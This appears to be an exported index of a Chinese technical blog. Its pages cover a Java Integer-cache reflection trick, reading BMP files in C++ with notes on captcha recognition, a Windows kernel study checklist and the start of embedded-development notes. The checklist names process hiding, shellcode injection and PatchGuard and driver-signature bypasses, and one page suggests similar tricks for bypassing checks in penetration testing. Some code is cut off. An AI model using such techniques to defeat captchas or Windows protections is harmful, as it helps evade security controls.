Integer.intValue() == int。 理论上本应只需要重写 Integer.intValue() 即可。 而事实上 Integer 声明了 final，不允许被继承，直接导致无法重写 Integer.intValue()。 public final class Integer extends Number implements Comparable { ...... public int intValue() { return value; } ...... } 换言之无法直接实现。 但是若条件变更如下，则有可能实现： a == (Integer) 1 && a == (Integer) 2 && a == (Integer) 3 该条件比对的是 Integer == Integer，由于两侧操作数均是对象，实际比对的是对象地址的引用，只需要想办法篡改两个引用的对象（使其相同）即可达到目的。 此时可以利用 Java【静态缓存】的特性 —— Integer 为了优化空间和效率，对于特定范围的常量值会放入常量池： 当 Integer 类 第一次 被载入内存时，会通过内部类 IntegerCache 把 [-128, 127] 范围内的整数包装成 Integer 对象并缓存到 Integer cache[] 数组。 以后再用 Integer 初始化变量时，若其赋值范围在 [-128, 127] 之间，则直接返回 cache 数组中对应的引用，不再重新开辟内存。 详细可见 Integer 的源码： public final class Integer extends Number implements Comparable { ...... private static class IntegerCache { static final int low = -128; static final int high; static final Integer cache[]; static { // high value may be configured by property int h = 127; String integerCacheHighPropValue = VM.getSavedProperty(\"java.lang.Integer.IntegerCache.high\"); if (integerCacheHighPropValue != null) { try { int i = parseInt(integerCacheHighPropValue); i = Math.max(i, 127); // Maximum array size is Integer.MAX_VALUE h = Math.min(i, Integer.MAX_VALUE - (-low) -1); } catch( NumberFormatException nfe) { // If the property cannot be parsed into an int, ignore it. } } high = h; cache = new Integer[(high - low) + 1]; int j = low; for(int k = 0; k = 127; } private IntegerCache() {} } /** * Returns an {@code Integer} instance representing the specified * {@code int} value. If a new {@code Integer} instance is not * required, this method should generally be used in preference to * the constructor {@link #Integer(int)}, as this method is likely * to yield significantly better space and time performance by * caching frequently requested values. * * This method will always cache values in the range -128 to 127, * inclusive, and may cache other values outside of this range. * * @param i an {@code int} value. * @return an {@code Integer} instance representing {@code i}. * @since 1.5 */ @HotSpotIntrinsicCandidate public static Integer valueOf(int i) { if (i >= IntegerCache.low && i 回到这题判断条件中的 1/2/3，因为是通过计算在 IntegerCache 数组索引，从而获取其包装类对象： (Integer) 1 => Integer.valueOf(1) => IntegerCache.cache[129] (Integer) 2 => Integer.valueOf(2) => IntegerCache.cache[130] (Integer) 3 => Integer.valueOf(3) => IntegerCache.cache[131] 那么只需要篡改 IntegerCache 数组，使得： IntegerCache.cache[130] = IntegerCache.cache[129] IntegerCache.cache[131] = IntegerCache.cache[129] 就可以令 1/2/3 取得的包装类是同一个对象（此时的 1/2/3 纯粹就是索引值）。 篡改方法可以用例 Java 的反射机制： import java.lang.reflect.Field; import java.util.concurrent.atomic.AtomicInteger; public class Java { public static void main(String[] args) throws Exception { // 利用反射机制获取 Integer cache[] 数组 Class clazz = Integer.class.getDeclaredClasses()[0]; Field field = clazz.getDeclaredField(\"cache\"); field.setAccessible(true); Integer[] cache = (Integer[]) field.get(clazz); cache[130] = cache[129]; // 令 (Integer) 2 = (Integer) 1 cache[131] = cache[129]; // 令 (Integer) 3 = (Integer) 1 field.setAccessible(false); Integer a = Integer.valueOf(1); if(a == (Integer) 1 && a == (Integer) 2 && a == (Integer) 3) { System.out.println(\"impossable!\"); } else { System.out.println(\"It's right.\"); } } } 但是这种做法不够优雅，毕竟改了题目。 那有没有不改题目的实现方式呢？ 是有的。 虽然 Integer 声明了 final，不允许被继承，导致无法重写 Integer.intValue()。 但是可以利用 AOP 切到 Integer.intValue() 方法进行篡改。 在 Stack Overflow 就有人给出了类似的解题思路（理论上是可行的，但我并没有去验证，有兴趣的同学可以试试）： import java.util.concurrent.atomic.AtomicInteger; import org.junit.Before; import org.junit.Test; import org.junit.runner.RunWith; import org.powermock.core.classloader.annotations.PrepareForTest; import org.powermock.modules.junit4.PowerMockRunner; @PrepareForTest(Integer.class) @RunWith(PowerMockRunner.class) public class TestJava { /** * 利用 AOP 把 Integer.intValue() 替换为 AtomicInteger.getAndIncrement() */ @Before public void before() { AtomicInteger ai = new AtomicInteger(1); // 自增整数 replace(method(Integer.class, \"intValue\")).with( (proxy, method, args) -> ai.getAndIncrement() // lambda ); } @Test public void test() { Integer a = 1; if(a == 1 && a == 2 && a == 3) { System.out.println(\"impossable!\"); } else { System.out.println(\"It's right.\"); } } } 幕间 通过前面的解题过程可以发现，弱类型语言 相较于 强类型语言 会更容易实现底层逻辑篡改，主要是因为对语法特性的校验会更宽松。 C++ 虽然和 Java 一样属于强类型语言，但是因为没有限制运算符重写而被钻了空子 在渗透测试中，或者可以利用类似的手段，绕过一些条件语句达到目的。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/technical/safe/CTF_Solving_Reports.html":{"url":"markdown/technical/safe/CTF_Solving_Reports.html","title":"CTF 解题报告","keywords":"","body":"CTF 解题报告CTF 解题报告 正在重定向到内容页面 ...... 如果您的浏览器没有自动跳转， 请点击这里 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 09:51:49 "},"markdown/technical/safe/threat_broadcast.html":{"url":"markdown/technical/safe/threat_broadcast.html","title":"威胁情报播报","keywords":"","body":"威胁情报播报威胁情报播报 正在重定向到内容页面 ...... 如果您的浏览器没有自动跳转， 请点击这里 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 09:51:49 "},"markdown/technical/crawler/":{"url":"markdown/technical/crawler/","title":"爬虫","keywords":"","body":"爬虫爬虫 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/technical/deeplearn/":{"url":"markdown/technical/deeplearn/","title":"深度学习","keywords":"","body":"深度学习深度学习 图像识别 – C++ 读取BMP位图入门 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/technical/deeplearn/图像识别_Cpp读取BMP位图入门.html":{"url":"markdown/technical/deeplearn/图像识别_Cpp读取BMP位图入门.html","title":"图像识别：C++ 读取BMP位图入门","keywords":"","body":"图像识别 – C++读取BMP位图入门前言BMP位图的数据结构P1. 位图文件头：BITMAPFILEHEADERP2. 位图信息头：BITMAPINFOHEADERP3. 调色板/颜色表：PaletteP4. 实际的位图数据读取BMP位图并简单处理关于图像识别图像识别 – C++读取BMP位图入门 前言 要识别图像中的字符，首先要会处理图像，把图像的信息读出来。这就必须先了解图像的结构，存储方式。这里推荐清华大学出版的一本《数字图像处理编程入门》，第一章的“Windows位图和调色板”有详细的介绍。 对于彩色图，可以用RGB模型来表示，这是BMP位图最常用的编码方法。基本上所有颜色都可以用这三种颜色的组合来形成。但实际上也有一些差别，小于24位图都利用到了调色板（也叫颜色表），也就是一张R、G、B表，主要是为了节省存储空间。 实际上，使用RGB模型表示的图像，也叫 三通道图（每个通道对应R、G、B）。三通道图每个像素值都通过R、G、B混合计算生成，R、G、B的取值范围为 0 ~ 255。 与之对应的则是 单通道图，也称灰度图，其每个像素点只能有有一个值表示颜色，它的像素值范围为 0 ~ 255，0是黑色，255是白色，中间值是一些不同等级的灰色。 除此之外，还有 四通道图 RGBA，最后的A表示透明度。 BMP位图的数据结构 BMP的数据结构由4部分组成： 数据段名称 对应的Windows结构体定义 大小（Bytes） 位图文件头 BITMAPFILEHEADER 14 位图信息头 BITMAPINFOHEADER 40 调色板 - 由颜色索引数决定 位图数据 - 由图像尺寸决定 P1. 位图文件头：BITMAPFILEHEADER 这部分是一个结构体，其定义如下： typedef struct tagBITMAPFILEHEADER { WORD bfType; DWORD bfSize; WORD bfReserved1; WORD bfReserved2; DWORD bfOffBits; } BITMAPFILEHEADER; 这个结构的长度是固定的，为14个字节（WORD为无符号16位整数，DWORD为无符号32位整数），各个域的说明如下： 变量名 地址偏移 大小（Bytes） 作用 bfType 0000H 2 指定文件类型，可取值为：BM : Windows 3.1x, 95, NT, ...BA : OS/2 Bitmap ArrayCI : OS/2 Color IconCP : OS/2 Color PointerIC : OS/2 IconPI : OS/2 Pointer实际上windows下固定值为0x424D，即字符串“BM” bfSize 0002H 4 说明该位图文件的大小（单位字节，且包括这14个字节） bfReserved1 0006H 2 保留字，必须设置为0 bfReserved2 0008H 2 保留字，必须设置为0 bfOffBits 000AH 4 说明从文件头开始到实际图像数据之间的字节偏移量（即上图中前三个部分的长度之和）。这个参数是非常有用的，因为位图信息头和调色板的长度会根据不同情况而变化，而我们可以利用这个偏移值迅速从文件中读到位图数据 P2. 位图信息头：BITMAPINFOHEADER 这部分也是一个结构体，其定义如下： typedef struct tagBITMAPINFOHEADER { DWORD biSize; LONG biWidth; LONG biHeight; WORD biPlanes; WORD biBitCount DWORD biCompression; DWORD biSizeImage; LONG biXPelsPerMeter; LONG biYPelsPerMeter; DWORD biClrUsed; DWORD biClrImportant; } BITMAPINFOHEADER; 这个结构的长度是固定的，为40个字节（LONG为32位整数），各个域的说明如下： 变量名 地址偏移 大小（Bytes） 作用 biSize 000EH 4 指定这个结构的长度，为40字节 biWidth 0012H 4 指定图象的宽度，单位是像素 biHeight 0016H 4 指定图象的高度，单位是像素。注：这个值除了用来描述图像的高度之外，它还用于指明这个图像是倒向还是正向的图像。若是正数则是倒向图像，若是负数则是正向图像。多数BMP图像都是正数，亦即是倒向图像。 biPlanes 001AH 2 为目标设备说明颜色的平面数。其值总是为1。 biBitCount 001CH 2 指定表示颜色时要用到的位数，常用的值为：1：黑白二色图4：16色图8：256色24：真彩色图注：新的BMP格式支持32位色 biCompression 001EH 4 说明图像数据的压缩类型，取值范围为：0：BI_RGB（不压缩，最常用）1：BI_RLE8（8比特游程编码，只用于8位位图）2：BI_RLE4（4比特游程编码，只用于4位位图）3：BI_BITFIELDS（比特位，用于16/32位位图）4：BI_JPEG（JPEG位图，仅用于打印机）5：BI_PNG（PNG位图，仅用于打印机）注：我们后面所讨论的只有不压缩的情况。 biSizeImage 0022H 4 指定实际的位图数据占用的字节数。若biCompression=BI_RGB，则可设置为0。其计算公式为：biSizeImage = biWidth' × biHeight注：biWidth' 必须是4的整倍数，因此公式里不是 biWidth。如：若 biWidth=240，则biWidth'=240　　若 biWidth=241，则biWidth'=244 biXPelsPerMeter 0026H 2 指定目标设备的水平分辨率。单位是每米的像素个数，是有符号整数。 biYPelsPerMeter 002AH 2 指定目标设备的垂直分辨率。单位是每米的像素个数，是有符号整数。 biClrUsed 002EH 2 指定本图象实际用到彩色表中的颜色索引数。若为0，则说明使用所有调色板项（数量为$\\small{2^{biBitCount}}$）。 biClrImportant 0032H 2 指定本图象中重要的颜色数。若为0，则认为所有的颜色都是重要的。 P3. 调色板/颜色表：Palette 当然，这里是对那些需要调色板的位图文件而言的。 前面已经说过，有些位图（如真彩色图）是不需要调色板的，即在 位图信息头BITMAPINFOHEADER 的后面直接就是位图数据。 调色板实际上是一个数组，共有biClrUsed个元素（如果该值为零，则有$\\small{2^{biBitCount}}$个元素）。 数组中每个元素的类型是一个RGBQUAD结构，占4个字节，其定义如下： typedef struct tagRGBQUAD { BYTE rgbBlue; //该颜色的蓝色分量 BYTE rgbGreen; //该颜色的绿色分量 BYTE rgbRed; //该颜色的红色分量 BYTE rgbReserved; //保留值 } RGBQUAD; P4. 实际的位图数据 对于用到调色板的位图，图象数据就是该象素颜在调色板中的索引值。 而对于不用调色板的位图，又分为2色、16色、256色位图和真彩色位图： 2色位图：用1位表示该象素的颜色（一般0表示黑，1表示白），所以一个字节可以表示8个象素 16色位图：用4位表示一个象素的颜色，所以一个字节可以表示2个象素 256色位图：一个字节刚好可以表示1个象素 真彩色图：图象数据就是实际的R、G、B值，即三个字节才能表示1个象素，这使得图像颜色显得更亮丽呢，但在存储上更费空间。 要注意两点： ① 位图数据的每一行的字节数必须是4的整倍数；若不是，则需要补齐（这在前面介绍 biSizeImage 时已经提到了）。 ② 一般来说，BMP文件的数据从下到上，从左到右的（即倒向图像，者在前面介绍 biHeight 时已经提到了）。 　　也就是说，从文件中最先读到的是图象最下面一行的左边第一个象素，然后是左边第二个象素……接下来是倒数第二行左边第一个象素，左边第二个象素……依次类推 ，最后得到的是最上面一行的最右一个象素。 读取BMP位图并简单处理 当了解了这些后，就可以编程读取BMP位图了。其像素信息，可以存储在一个一维数组里面，以后处理图片就是直接对这个数组进行处理。 下面是示例源码： #include #include #include #include #include #include #include #include //--- //以下该模块是完成BMP图像(彩色图像是24bit RGB各8bit)的像素获取，并存在文件名为xiang_su_zhi.txt中 unsigned char *pBmpBuf;//读入图像数据的指针 int bmpWidth;//图像的宽 int bmpHeight;//图像的高 RGBQUAD *pColorTable;//颜色表指针 int biBitCount;//图像类型，每像素位数 //------- //读图像的位图数据、宽、高、颜色表及每像素位数等数据进内存，存放在相应的全局变量中 bool readBmp(char *bmpName) { FILE *fp=fopen(bmpName,\"rb\");//二进制读方式打开指定的图像文件 if(fp==0) return 0; //跳过位图文件头结构BITMAPFILEHEADER fseek(fp, sizeof(BITMAPFILEHEADER),0); //定义位图信息头结构变量，读取位图信息头进内存，存放在变量head中 BITMAPINFOHEADER head; fread(&head, sizeof(BITMAPINFOHEADER), 1,fp); //获取图像宽、高、每像素所占位数等信息 bmpWidth = head.biWidth; bmpHeight = head.biHeight; biBitCount = head.biBitCount;//定义变量，计算图像每行像素所占的字节数（必须是4的倍数） int lineByte=(bmpWidth * biBitCount/8+3)/4*4;//灰度图像有颜色表，且颜色表表项为256 if(biBitCount==8) { //申请颜色表所需要的空间，读颜色表进内存 pColorTable=new RGBQUAD[256]; fread(pColorTable,sizeof(RGBQUAD),256,fp); } //申请位图数据所需要的空间，读位图数据进内存 pBmpBuf=new unsigned char[lineByte * bmpHeight]; fread(pBmpBuf,1,lineByte * bmpHeight,fp); fclose(fp);//关闭文件 return 1;//读取文件成功 } //----- //给定一个图像位图数据、宽、高、颜色表指针及每像素所占的位数等信息,将其写到指定文件中 bool saveBmp(char *bmpName, unsigned char *imgBuf, int width, int height, int biBitCount, RGBQUAD *pColorTable) { //如果位图数据指针为0，则没有数据传入，函数返回 if(!imgBuf) return 0; //颜色表大小，以字节为单位，灰度图像颜色表为1024字节，彩色图像颜色表大小为0 int colorTablesize=0; if(biBitCount==8) colorTablesize=1024; //待存储图像数据每行字节数为4的倍数 int lineByte=(width * biBitCount/8+3)/4*4; //以二进制写的方式打开文件 FILE *fp=fopen(bmpName,\"wb\"); if(fp==0) return 0; //申请位图文件头结构变量，填写文件头信息 BITMAPFILEHEADER fileHead; fileHead.bfType = 0x4D42;//bmp类型 //bfSize是图像文件4个组成部分之和 fileHead.bfSize= sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + colorTablesize + lineByte*height; fileHead.bfReserved1 = 0; fileHead.bfReserved2 = 0; //bfOffBits是图像文件前3个部分所需空间之和 fileHead.bfOffBits=54+colorTablesize; //写文件头进文件 fwrite(&fileHead, sizeof(BITMAPFILEHEADER),1, fp); //申请位图信息头结构变量，填写信息头信息 BITMAPINFOHEADER head; head.biBitCount=biBitCount; head.biClrImportant=0; head.biClrUsed=0; head.biCompression=0; head.biHeight=height; head.biPlanes=1; head.biSize=40; head.biSizeImage=lineByte*height; head.biWidth=width; head.biXPelsPerMeter=0; head.biYPelsPerMeter=0; //写位图信息头进内存 fwrite(&head, sizeof(BITMAPINFOHEADER),1, fp); //如果灰度图像，有颜色表，写入文件 if(biBitCount==8) fwrite(pColorTable, sizeof(RGBQUAD),256, fp); //写位图数据进文件 fwrite(imgBuf, height*lineByte, 1, fp); //关闭文件 fclose(fp); return 1; } //---- //以下为像素的读取函数 void doIt() { //读入指定BMP文件进内存 char readPath[]=\"nv.BMP\"; readBmp(readPath); //输出图像的信息 couthang-8;L1--)//8*8矩阵行 { for(int L2=lie;L2 关于图像识别 在图像识别领域中（如验证码识别），常规的图像处理流程是：灰度化/二值化、去噪（包括嘈点和干扰线）、字符分隔、字符归一化、识别训练。 其中灰度化/二值化其实都是为去噪做准备的，毕竟相对于彩色图像，黑白图像在进行噪点识别时会更简单、运算量也少。 去噪的方法有很多，常见的有： 8邻域降噪（均值滤波/中值滤波）：对于去除小的噪点很有效，计算量也不大 连通域降噪（泛水填充法）：适合去除大的噪点，常作为二次降噪手段，与8邻域降噪配合使用 但如果实际的验证码的嘈点或干扰线的颜色，明显与主图像不同，那么可以先去噪再进行灰度化/二值化。 经过前面去除噪点/干扰线，验证码图像现在只剩下两个部分：白色的背景色，黑色的字符前景色。而为了字符的识别，此时就需要对图像中上的字符进行切割：把它们一个一个“抠”下来，得到单个的字符，再进行OCR识别。 但是OCR通常只能用于比较正规的字符识别。而验证码图片的一般字符都是经过特殊处理的，如扭曲、倾斜、旋转等，这种字符是无法用OCR识别的。此时就需要对字符进行归一化处理了。 所谓的归一化，其实就是通过一些特殊处理，把字符尽可能还原成扭曲、倾斜、旋转之前的形状，然后再把缩放到一个固定大小（如32x32）。此时再把这个32x32的字符进行网格划分成4x4共16块（当然若有必要可以继续划分这些子块）。我们可以计算每一块的特征值，最后就得到这个字符的4x4矩阵的网格特征值，这就是归一化。 最后就是字符识别了：可以预先准备标准的字符图像库，通过归一化提前计算图像库中每个字符的网格特征值作为参照特征值。这时只需要把从验证码图像中提取的字符的网格特征值，与这些参照特征值进行匹配，相似度最高的，就认为识别成功了。 当然，由于真实图像中的字符的变形程度都不同，所以单凭一次的特征值匹配是不可信的，由此就需要大量的验证码图像训练进行逼近（通常需要至少数万次的匹配训练才可能能得到一个相对可靠的训练库）。 而这就是现在比较热门的深度学习领域在做的事情了，有兴趣进一步入门的同学，可以了解一下MINIST机器学习，会对图像识别有更深一层的了解（推荐使用python做） Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/technical/blockchain/":{"url":"markdown/technical/blockchain/","title":"区块链","keywords":"","body":"区块链区块链 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/technical/bigdata/":{"url":"markdown/technical/bigdata/","title":"大数据","keywords":"","body":"大数据大数据 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/technical/re/":{"url":"markdown/technical/re/","title":"逆向工程","keywords":"","body":"逆向工程逆向工程 WINDOWS内核学习顺序指引清单 嵌入式开发学习笔记 (java – c/c++：从入门到入门) 驱动开发入门 – 之一：Win7 SP1 x64 驱动开发环境搭建 驱动开发入门 – 之二：Win7-x64 + VMWare (Win7-x64) + WinDbg 双机调试环境搭建 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/technical/re/WINDOWS内核学习清单.html":{"url":"markdown/technical/re/WINDOWS内核学习清单.html","title":"WINDOWS内核学习清单","keywords":"","body":"WINDOWS 内核学习顺序指引清单前言1. 基础知识1.1. 驱动框架（NT和WDM）1.2. 驱动基础（编程概念、内核函数、基本数据结构等等）1.3. 驱动通信（R3主动与R0通信、R0主动与R3交互）1.4. 基本操作（系统线程、工作队列、计时器、字符串、内存、链表等等等等）2. 进程相关2.1. 枚举进程（PID、EPROCESS、进程路径等）2.2. 结束进程（多种方法）2.3. 挂起进程2.4. 恢复进程2.5. 保护进程（API HOOK、回调）2.6. 隐藏进程（API HOOK、DKOM）2.7. 枚举线程2.8. 结束线程（多种方法）2.9. 挂起线程2.10. 恢复线程2.11. 枚举DLL（多种方法）2.12. 卸载DLL2.13. 注入DLL/SHELLCODE（NT6注入到系统进程）2.14. RING3 INLINE HOOK/UNHOOK/绕过（多种方法）2.15. RING3 EAT HOOK/UNHOOK2.16. RING3 IAT HOOK/UNHOOK2.17. 窗口操作（枚举、发消息、隐藏/显示、启用/禁用等）2.18. 内存操作（枚举、申请、释放、读写、修改保护类型等）2.19. 消息钩子（枚举、删除）2.20. 内核回调表（枚举、清除HOOK）2.21. 枚举句柄2.22. .关闭句柄2.23. 监控进程创建/退出（API HOOK、回调）2.24. 监控线程创建/退出（API HOOK、回调）2.25. 监控DLL加载（API HOOK、回调）3. 文件相关3.1. API层文件操作（枚举、复制、删除、重命名）3.2. FSD层文件操作（枚举、复制、删除、重命名）3.3. DISK层文件操作（读写）3.4. 解析NTFS/FAT323.5. 监控文件操作（API HOOK、SFILTER、MINIFILTER）4. 注册表相关4.1. API层注册表操作（枚举、新建、删除、重命名）4.2. 解析HIVE操作注册表4.3. 监控注册表操作（API HOOK、回调、DKOH）5. HOOK相关5.1. SSDT HOOK/UNHOOK（包括SHADOW SSDT）5.2. INLINE HOOK/UNHOOK/绕过（多种方法）5.3. IRP HOOK5.4. OBJECT HOOK/UNHOOK5.5. IDT HOOK/UNHOOK5.6. EAT HOOK/UNHOOK5.7. IAT HOOK/UNHOOK5.8. MSR HOOK/UNHOOK6. 内核相关6.1. 枚举内核模块（链表、目录对象、暴搜）6.2. 监控驱动加载（API HOOK、回调）6.3. 枚举/删除回调（进程、线程、映像、注册表、蓝屏、关机、对象、文件系统改变）6.4. 枚举/删除定时器（IO/DPC）6.5. 枚举GDT7. 网络相关7.1. 内核网络通信（TDI、WSK）7.2. 监控网络通信（WFP、TDI HOOK、NDIS HOOK、NDIS FILTER）7.3. 枚举网络连接（API方法、发IRP法）7.4. 枚举/挂钩NDIS处理函数7.5. 流量统计/下载限速7.6. 端口复用8. 64位系统专用8.1. 破解PATCHGUARD（动态/静态）8.2. 破解DSE（动态/静态）9. 杂项9.1. 对象劫持9.2. 符号操作9.3. PE解析9.4. 反调试10. 整体项目10.1. PE工具10.2. ARK10.3. 调试器10.4. 主动防御10.5. 沙箱10.6. 透明加密10.7. VT级调试/反调试/主动防御11. 其他11.1. MFC开发WINDOWS 内核学习顺序指引清单 前言 鉴于很多同学想学习 逆向工程，但是找不到切入点导致无从入手，因此编写了这个指引清单。 本文原则上只是一个学习指引目录（虽然部分章节有提供一些资料），因涉及知识面太多，具体内容以后再逐渐填充。 有兴趣的同学可根据指引清单，先行逐步扩展学习每个知识点。当整个清单都弄懂了，也就入门了（对的，你没看错，只是入门）。 1. 基础知识 1.1. 驱动框架（NT和WDM） 《NT - WDM - WDF 驱动概念》 1.2. 驱动基础（编程概念、内核函数、基本数据结构等等） 《WDM驱动程序的基本结构和实例》 《Windows驱动开发常用的数据结构》 《内存管理》 《CE驱动开发常用宏定义》 《windows 内核函数前缀解析》 《Windows常用内核函数》 1.3. 驱动通信（R3主动与R0通信、R0主动与R3交互） R3：用户层 R0：内核层 《ring0和ring3的区别》 1.4. 基本操作（系统线程、工作队列、计时器、字符串、内存、链表等等等等） ...... 2. 进程相关 2.1. 枚举进程（PID、EPROCESS、进程路径等） 《四种方法实现VC枚举系统当前进程》 《C++枚举进程的方法》 《IsWow64Process函数理解的偏差》 2.2. 结束进程（多种方法） ...... 2.3. 挂起进程 ...... 2.4. 恢复进程 ...... 2.5. 保护进程（API HOOK、回调） ...... 2.6. 隐藏进程（API HOOK、DKOM） ...... 2.7. 枚举线程 ...... 2.8. 结束线程（多种方法） ...... 2.9. 挂起线程 ...... 2.10. 恢复线程 ...... 2.11. 枚举DLL（多种方法） ...... 2.12. 卸载DLL ...... 2.13. 注入DLL/SHELLCODE（NT6注入到系统进程） ...... 2.14. RING3 INLINE HOOK/UNHOOK/绕过（多种方法） ...... 2.15. RING3 EAT HOOK/UNHOOK ...... 2.16. RING3 IAT HOOK/UNHOOK ...... 2.17. 窗口操作（枚举、发消息、隐藏/显示、启用/禁用等） ...... 2.18. 内存操作（枚举、申请、释放、读写、修改保护类型等） ...... 2.19. 消息钩子（枚举、删除） ...... 2.20. 内核回调表（枚举、清除HOOK） ...... 2.21. 枚举句柄 ...... 2.22. .关闭句柄 ...... 2.23. 监控进程创建/退出（API HOOK、回调） ...... 2.24. 监控线程创建/退出（API HOOK、回调） ...... 2.25. 监控DLL加载（API HOOK、回调） ...... 3. 文件相关 3.1. API层文件操作（枚举、复制、删除、重命名） ...... 3.2. FSD层文件操作（枚举、复制、删除、重命名） ...... 3.3. DISK层文件操作（读写） ...... 3.4. 解析NTFS/FAT32 ...... 3.5. 监控文件操作（API HOOK、SFILTER、MINIFILTER） ...... 4. 注册表相关 4.1. API层注册表操作（枚举、新建、删除、重命名） ...... 4.2. 解析HIVE操作注册表 ...... 4.3. 监控注册表操作（API HOOK、回调、DKOH） ...... 5. HOOK相关 5.1. SSDT HOOK/UNHOOK（包括SHADOW SSDT） ...... 5.2. INLINE HOOK/UNHOOK/绕过（多种方法） ...... 5.3. IRP HOOK ...... 5.4. OBJECT HOOK/UNHOOK ...... 5.5. IDT HOOK/UNHOOK ...... 5.6. EAT HOOK/UNHOOK ...... 5.7. IAT HOOK/UNHOOK ...... 5.8. MSR HOOK/UNHOOK ...... 6. 内核相关 6.1. 枚举内核模块（链表、目录对象、暴搜） ...... 6.2. 监控驱动加载（API HOOK、回调） ...... 6.3. 枚举/删除回调（进程、线程、映像、注册表、蓝屏、关机、对象、文件系统改变） ...... 6.4. 枚举/删除定时器（IO/DPC） ...... 6.5. 枚举GDT ...... 7. 网络相关 7.1. 内核网络通信（TDI、WSK） ...... 7.2. 监控网络通信（WFP、TDI HOOK、NDIS HOOK、NDIS FILTER） ...... 7.3. 枚举网络连接（API方法、发IRP法） ...... 7.4. 枚举/挂钩NDIS处理函数 ...... 7.5. 流量统计/下载限速 ...... 7.6. 端口复用 ...... 8. 64位系统专用 8.1. 破解PATCHGUARD（动态/静态） 《过Patchguard的梗》 《过patchguard源码》 《在Win7x64上加载无签名驱动以及让PatchGuard失效(Win7x64内核越狱)》 《让PatchGuard变狗屎的那些方法》 8.2. 破解DSE（动态/静态） 《攻破WIN7~WIN10的KPP和DSE（WIN64内核越狱）》 《WIN64免签名加载驱动SDK》 《神奇的内核路径欺骗》 《Win7x64全自动无提示破解PatchGuard和Driver Signature Enforcement》 《在Win64系统上动态加载无签名驱动：WIN64UDL》 《Win7 x64动态开启DSE》 9. 杂项 9.1. 对象劫持 ...... 9.2. 符号操作 ...... 9.3. PE解析 ...... 9.4. 反调试 ...... 10. 整体项目 10.1. PE工具 ...... 10.2. ARK ...... 10.3. 调试器 ...... 10.4. 主动防御 ...... 10.5. 沙箱 ...... 10.6. 透明加密 ...... 10.7. VT级调试/反调试/主动防御 ...... 11. 其他 11.1. MFC开发 《VS2010/MFC编程入门教程之目录和总结》 《VS2010/MFC编程入门》 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/technical/re/嵌入式开发学习笔记.html":{"url":"markdown/technical/re/嵌入式开发学习笔记.html","title":"嵌入式开发学习笔记","keywords":"","body":"嵌入式开发学习笔记 (java – c/c++：从入门到入门)1. 前言2. 缩略词/名词解释3. 开发环境/测试环境4. 开坑：提要5. 入坑：JNI5.1. navicate 接口定义5.2. 执行JNI命令生成C/C++的头文件5.3. 编写C/C++程序实现接口5.4. Java加载DLL动态链接库5.5. 为什么不用JNA ?6. 挖坑：跨平台编程6.1. DLL动态链接库的加载与调用6.2. DLL的编译（x86与x64）6.3. 乱入的ELF头6.4. SO也是动态连接库6.5.编译SO动态链接库（x64）6.6.编译SO动态链接库（x86）6.7. SO的编译小结（x86与x64）6.8. make构建更优雅7. 填坑：跨平台调试7.1. 程序无法运行在其他win平台7.2. x86和x64运行结果不一致8. 回顾：嵌入式开发入门过程9.后话10. 资源下载嵌入式开发学习笔记 (java – c/c++：从入门到入门) 1. 前言 作为嵌入式开发的入门笔记，主要是为了记录我自己在过程中遇到的磕磕碰碰的问题以及解决方案，以便自己以后回顾，也希望大家少走弯路。 其实也是苦于网上均无完整资料，不才以备一份罢了。 不过此笔记换了一种叙述风格，除了记录了我在学习过程中的细节，有时还记录了当时的心理状态，可能显得相对啰嗦，不喜的同学可以直接跳过。 本文适合有扎实的Java和C/C++功底，且会一定的Linux基础的同学阅读。当然如果是浸淫在嵌入式开发多年的同学，可以不再往下读了，当然我很乐意你能对我提出指正。 [!NOTE|style:flat|label:注意] 本文的内容会围绕我的一个小程序 OTP动态令牌 进行讲解。 它是一个Java/C++的嵌入式程序，功能是提供OTP（One-time Password）动态令牌API。 其作用类似于QQ、新浪之类的登陆盾牌：1. 生成时效令牌； 2. 校验时效令牌 -------------------------------------------------------------------------------------------------- 其中Java项目名称为 dynamic-token，通过内部调用C++动态链接库对外提供API。 而C++项目名称为 dt_otp，是一个动态链接库项目，负责令牌的生成与校验。 -------------------------------------------------------------------------------------------------- 在本文的最后会提供其源码供大家下载参考。 2. 缩略词/名词解释 缩略语/名词 英文全称 说明 GCC GNU Compiler Collection C/C++编译器 JNI Java Native Interface Java本地接口 JNA Java Native Access Java本地访问 DLL Dynamic Link Library 动态链接库（win平台） SO Shared Object 共享对象（linux平台的动态链接库） ELF Executable and Linkable Format 可执行链接格式 3. 开发环境/测试环境 这里仅列出我做嵌入式开发/测试时用到的环境，不一定照搬。 还有就是，这里有一些工具其实是多余的，所以不必急着安装。 环境 版本 主机操作系统 win8 x64 虚拟机操作系统 Ubuntu x64 Java开发环境 Eclipse Luna (4.4.1) C/C++开发环境 VC6.0（弃用）VCExpress（过渡）VS2008 或 VS2010（推荐） Java编译环境 JDK 1.6 (x64/x86) C/C++编译环境 GCC 4.9.2 (x64/x86) 交叉编译工具 Cygwin x64（弃用） 4. 开坑：提要 这并不是我第一次接触嵌入式开发。 最初使用到的是 [C/C++ - 汇编] 的嵌入式开发，我还记得是一个通过获取CPU时钟频率来运行闹钟。不过由于C和汇编都是比较底层的语言，且所开发的程序相对简单，当时也觉得“不过如此罢了”，就放下这段经历了。 这次重拾嵌入式开发，诱因是工作项目需求，要实现一个安全校验的功能，且要支持win和Linux系统。 